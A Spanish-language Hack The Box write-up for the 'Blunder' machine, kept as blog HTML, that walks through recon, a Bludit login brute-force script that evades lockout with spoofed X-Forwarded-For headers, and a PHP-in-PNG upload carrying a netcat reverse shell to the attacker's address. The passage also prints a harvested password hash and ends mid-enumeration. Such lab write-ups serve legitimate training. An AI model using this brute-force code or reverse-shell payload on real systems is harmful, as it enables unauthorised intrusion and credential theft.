@@ -1,0 +1,824 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Blunder - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Blunder en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Blunder">
+<meta property="og:url" content="http://localhost:4000/htb-blunder/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Blunder en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-blunder/blunder.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-13T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-blunder/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Blunder</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Blunder">
+    <meta itemprop="description" content="Resolución de la máquina Blunder en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="March 13, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Blunder
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-13T00:00:00-06:00">March 13, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-blunder/banner-blunder.jpg" alt="" /></p>
+
+<h2 id="blunder">Blunder</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.191.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.191
+PING 10.10.10.191 <span class="o">(</span>10.10.10.191<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.191: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>138 ms
+
+<span class="nt">---</span> 10.10.10.191 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 137.673/137.673/137.673/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.191 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-12 21:51 CST
+Initiating SYN Stealth Scan at 21:51
+Scanning 10.10.10.191 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.191
+Completed SYN Stealth Scan at 21:52, 26.42s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.191
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-03-12 21:51:38 CST <span class="k">for </span>27s
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 1 closed tcp port <span class="o">(</span>reset<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.50 seconds
+           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>876B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 114 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.191
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.10.191 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-12 21:52 CST
+Nmap scan report <span class="k">for </span>10.10.10.191
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: Blunder
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.05 seconds
+</code></pre></div></div>
+
+<p>Tenemos el puerto 80 abierto, así que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta  <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.191
+http://10.10.10.191 <span class="o">[</span>200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
+</code></pre></div></div>
+
+<p>No vemos nada interesante, así que vamos a ver el contenido vía web.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web.png" alt="" /></p>
+
+<p>En la web no vemos algo que nos llame la atención, así que vamos a tratar de descubrir rutas con <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>918 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000026:   200        105 L    303 W      3280 Ch     "about"                                                         
+000000259:   301        0 L      0 W        0 Ch        "admin"                                                         
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 45.73100
+Processed Requests: 1190
+Filtered Requests: 1188
+Requests/sec.: 26.02173
+</span></code></pre></div></div>
+
+<p>Vemos que tiene un recurso bajo <code class="language-plaintext highlighter-rouge">admin</code> el cual nos lleva a un panel de login de <strong>BLUDIT</strong>, que si buscamos un poco, tenemos que es un gestor de contenido el cual utiliza archivos en formato JSON para almacenar el contenido, no es necesario instalar ni configurar una base de datos. Para saber un poco más, podemos consultar el siguiente recurso <a href="https://www.bludit.com/es/">bludit</a>.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web1.png" alt="" /></p>
+
+<p>Ahora vamos a tratar de buscar archivo alojados en el servidor de extensión txt, php, html, etc. Comenzaremos con txt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>918 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ.txt
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000001765:   200        1 L      4 W        22 Ch       "robots"                                                        
+000002495:   200        4 L      23 W       118 Ch      "todo"                                                          
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 3452
+Filtered Requests: 3450
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">todo.txt</code>, vamos a echarle un ojo.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web2.png" alt="" /></p>
+
+<p>Tenemos un posible nombre de usuario: <strong>fergus</strong>; así que lo que podríamos hacer es tratar de aplicar fuerza bruta el panel de login utilizando como diccionario las palabras de la misma página web con la herramienta <code class="language-plaintext highlighter-rouge">cewl</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cewl <span class="nt">-w</span> diccionario.txt http://10.10.10.191/
+CeWL 5.4.8 <span class="o">(</span>Inclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Antes de empezar el ataque de fuerza bruta, vamos a verificar si el servidor cuenta con algún tipo de bloqueo.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web3.png" alt="" /></p>
+
+<p>Vemos que el servidor bloquea las peticiones de nuestra dirección IP al intentar loguearnos múltiples veces en poco tiempo; por lo tanto vamos a investigar si encontramos algo para realizar bypass de la protección <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">rastating</a>. El articulo nos indica que la función <strong>getUserIp</strong> determina la dirección IP y confía en el valor de la cabecera <strong>X-Forwarded-For</strong>; por lo que podríamos tratar de modificar dicha cabecera de forma dinámica para burlar la protección.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding:utf-8
+</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">signal</span><span class="p">,</span><span class="n">time</span><span class="p">,</span><span class="n">requests</span><span class="p">,</span><span class="n">re</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>
+
+<span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.10.191/admin/login.php"</span>
+<span class="n">dictionary</span> <span class="o">=</span> <span class="s">"diccionario.txt"</span>
+
+<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+        
+        <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Fuerza bruta Bludit"</span><span class="p">)</span>
+        <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando los datos a enviar"</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dictionary</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">)</span>
+                <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'tokenCSRF" value=(".*?")'</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'"'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+
+                <span class="n">headers_data</span> <span class="o">=</span> <span class="p">{</span>
+                    <span class="s">'User-Agent'</span> <span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0'</span><span class="p">,</span>
+                    <span class="s">'Referer'</span> <span class="p">:</span> <span class="s">'http://10.10.10.191/admin/login.php'</span><span class="p">,</span>
+                    <span class="s">'X-Forwarded-For'</span> <span class="p">:</span> <span class="n">password</span>
+                <span class="p">}</span>
+
+                <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+                    <span class="s">'tokenCSRF'</span> <span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+                    <span class="s">'username'</span> <span class="p">:</span> <span class="s">'fergus'</span><span class="p">,</span>
+                    <span class="s">'password'</span> <span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+                    <span class="s">'save'</span> <span class="p">:</span> <span class="s">''</span>
+                <span class="p">}</span>
+
+                <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers_data</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+                <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Probando credenciales: fergus - {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+
+                <span class="k">if</span> <span class="s">"Username or password incorrect"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"La contraseña del usuario fergus es: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+                    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">makeRequest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 bruteforce_bypass_bludit.py
+<span class="o">[</span>+] Fuerza bruta Bludit: La contraseña del usuario fergus es: RolandDeschain
+</code></pre></div></div>
+
+<p>Ya tenemos la contraseña del usuario <strong>fergus</strong>, por lo que antes de que algo pase, vamos a guardarla para tenerla presente. Ahora vamos a ingresarlas en el panel de login.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web4.png" alt="" /></p>
+
+<p>Buscando un poco en internet, vemos que existe el exploit <a href="https://www.exploit-db.com/exploits/48701">exploit-db</a> el cual nos ayuda a subir un archivo para tener ejecución de comandos a nivel de sistema. Por lo tanto, lo traemos a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> multiple/webapps/48701.txt
+  Exploit: Bludit 3.9.2 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/48701
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/48701.txt
+File Type: Python script, ASCII text executable
+
+Copied to: /home/k4miyo/Documentos/HTB/Blunder/exploits/48701.txt
+
+
+❯ <span class="nb">mv </span>48701.txt bludit_rce.py
+</code></pre></div></div>
+
+<p>Lo leemos para ver que nos pide o que necesitamos para poderlo ejecutar. Cambiamos los valodres de url, username y password. Ahora creamos nuestro archivo png con contenido php que nos permita entablarnos la reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>k4mishell.png
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: k4mishell.png
+       │ Size: 98 B
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &lt;?php system<span class="o">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f"</span><span class="o">)</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<p>Creamos el payload2 de acuerdo con lo que nos indica el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"RewriteEngine off"</span> <span class="o">&gt;</span> .htaccess
+❯ <span class="nb">echo</span> <span class="s2">"AddType application/x-httpd-php .png"</span> <span class="o">&gt;&gt;</span> .htaccess
+</code></pre></div></div>
+
+<p>Ejecutamos el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 bludit_rce.py
+cookie: 9lqjvu73d8l94eu4vj44ml1uc4
+csrf_token: 550b5a0bda69882d0de4407c6423bfe5d7d16cf0
+Uploading payload: k4mishell.png
+Uploading payload: .htaccess
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha por el puerto 443 y ahora dice que debemos ingresar a la ruta <code class="language-plaintext highlighter-rouge">/bl-content/tmp/temp/</code> y deberíamos ver nuestro archivo. Por lo que al seleccionarlo deberíamos tener la conexión.</p>
+
+<p><img src="/assets/images/htb-blunder/blunder-web5.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.191] 43240
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+</span></code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y antes de hacer algo, vamos a realizar un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Vemos que no podemos visualizar la flag (user.txt) y tenemos que convertirnos en el usuario <strong>hugo</strong>; así que vamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/home<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@blunder:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+
+We trust you have received the usual lecture from the <span class="nb">local </span>System
+Administrator. It usually boils down to these three things:
+
+    <span class="c">#1) Respect the privacy of others.</span>
+    <span class="c">#2) Think before you type.</span>
+    <span class="c">#3) With great power comes great responsibility.</span>
+
+Password: 
+www-data@blunder:/home<span class="nv">$ </span><span class="nb">cd</span> /var/www/
+www-data@blunder:/var/www<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="nt">-i</span> <span class="s2">"hugo"</span> 2&gt;/dev/null
+bludit-3.10.0a/bl-content/databases/users.php:        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+bludit-3.10.0a/bl-content/databases/users.php:        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+www-data@blunder:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos dos archivos en donde se hace mención del usuario <strong>hugo</strong>, así que vamos a echarles un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www<span class="nv">$ </span><span class="nb">cat </span>bludit-3.10.0a/bl-content/databases/users.php 
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>
+<span class="o">}</span>
+www-data@blunder:/var/www<span class="nv">$ </span><span class="nb">cat </span>bludit-3.10.0a/bl-content/databases/users.php 
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
